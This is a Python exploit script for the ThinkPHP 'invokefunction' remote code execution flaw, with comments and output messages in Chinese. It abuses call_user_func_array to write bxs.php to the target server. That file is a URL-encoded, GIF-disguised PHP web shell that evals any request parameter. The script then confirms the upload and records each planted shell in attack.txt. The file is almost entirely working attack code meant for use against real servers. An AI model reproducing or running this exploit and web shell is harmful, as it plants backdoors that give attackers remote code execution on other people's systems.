import requests
import urllib3
# 验证完毕
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check(url):
    print(f"[info] {url}-invoke_func_code_exec漏洞")
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Content-Length": "319",
        "Connection": "close"
    }

    try:
        dataurl = r"index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=bxs.php&vars[1][]=Gif89a%3C%3Fphp+class+GYUJ9g7l+%7B+public+function+__construct%28%24H7zX3%29%7B+%40eval%28%22%2F*Z7Cc4urWV9*%2F%22.%24H7zX3.%22%2F*Z7Cc4urWV9*%2F%22%29%3B+%7D%7Dnew+GYUJ9g7l%28%24_REQUEST%5B%274k4d666%27%5D%29%3B%3F%3E"
        urlt = url
        url = urlt+dataurl
        requests.get(url=fr"{url}",timeout=3,headers=headers,verify=False)
        print(urlt)
        resr = requests.post(url=f"{urlt}/bxs.php",headers=headers,verify=False,timeout=5)
        print(urlt)
        if "Gif89a" in resr.text :
            print(f"---->[invoke_func_code_exec] 上传成功，请检查：{urlt}/bxs.php")
            with open("attack.txt",'a') as attack:
                attack.write(f"shell:{url}/bxs.php,invoke_func_code_exec\n")
            
    except:
        try:

            res2 = requests.post(url=f"{urlt}/bxs.php",verify=False,timeout=5)
            if "Gif89a" in res2.text :
                print(f"---->[invoke_func_code_exec] 上传成功，请检查：{urlt}/bxs.php")
                with open("attack.txt",'a') as attack:
                    attack.write(f"shell:{urlt}/bxs.php,invoke_func_code_exec\n")

        except:
            print(f"[error] {urlt}-invoke_func_code_exec漏洞")
    pass
